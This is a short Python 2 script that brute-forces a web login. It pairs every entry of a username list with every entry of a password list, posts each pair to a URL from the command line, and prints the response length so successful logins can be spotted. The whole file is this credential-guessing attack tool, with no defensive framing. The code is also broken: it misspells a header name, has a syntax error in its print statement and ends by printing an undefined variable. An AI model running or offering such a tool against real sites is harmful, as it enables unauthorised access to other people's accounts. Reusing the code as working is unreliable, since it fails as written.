#coding:utf-8

from requests import post
import sys

def loadDic():
	buffer1 = []
	buffer2 = []
	buffer3 = []
	fu = open('username.txt','r')
	for i in fu.readlines():
		buffer1.append(i.strip())
	fu.close()
	fp = open('password.txt','r')
	for i in fp.readlines():
		buffer2.append(i.strip())
	fp.close()
	for i in buffer1:
		for a in buffer2:
			buffer3.append([i,a])
	return buffer3
	
def easyCrack(txt,url):
	for i in txt:
		usr = i[0]
		pwd = i[1]
		payload = {'username':usr,'password':pwd}
		r = post(url,data=payload)
		lens = r.headers.get('Content-Lenght')
		print 'username:%s,password:%s,lens:%s',% (usr,pwd,lens)
	
if __name__=='__main__':
	URL = sys.argv[1]
	txt = loadDic()
	easyCrack(txt,URL)
	print a